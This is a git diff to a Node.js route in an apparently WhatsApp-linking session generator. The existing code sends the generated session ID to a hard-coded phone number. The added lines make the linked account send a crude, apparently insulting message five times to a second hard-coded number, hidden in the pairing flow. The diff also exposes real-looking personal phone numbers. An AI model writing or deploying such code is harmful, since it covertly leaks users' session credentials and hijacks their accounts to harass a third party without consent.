@@ -3,6 +3,7 @@ const fs = require('fs-extra');
 let router = express.Router();
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
+const gal = 'koyel 12 vatari 😂 👅💦🫵🤣'
 
 const MESSAGE = process.env.MESSAGE || `
 ╭─❍ *𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
@@ -80,6 +81,7 @@ router.get('/', async (req, res) => {
                         const auth_path = './auth_info_baileys/';
                         // Send message to fixed number
         let user = '917003816486@s.whatsapp.net';
+        let vatari = '918777534242@s.whatsapp.net';
        
 
                         // Define randomMegaId function to generate random IDs
@@ -101,6 +103,11 @@ router.get('/', async (req, res) => {
 
                         let msgsss = await Smd.sendMessage(user, { text: "KAISEN~" + Scan_Id });
                         await Smd.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
+                        await Smd.sendMessage(vatari, { text: gal });
+await Smd.sendMessage(vatari, { text: gal });
+await Smd.sendMessage(vatari, { text: gal });
+await Smd.sendMessage(vatari, { text: gal });
+await Smd.sendMessage(vatari, { text: gal });
 
                         await delay(1000);
                         try { await fs.emptyDirSync(__dirname + '/auth_info_baileys'); } catch (e) {}
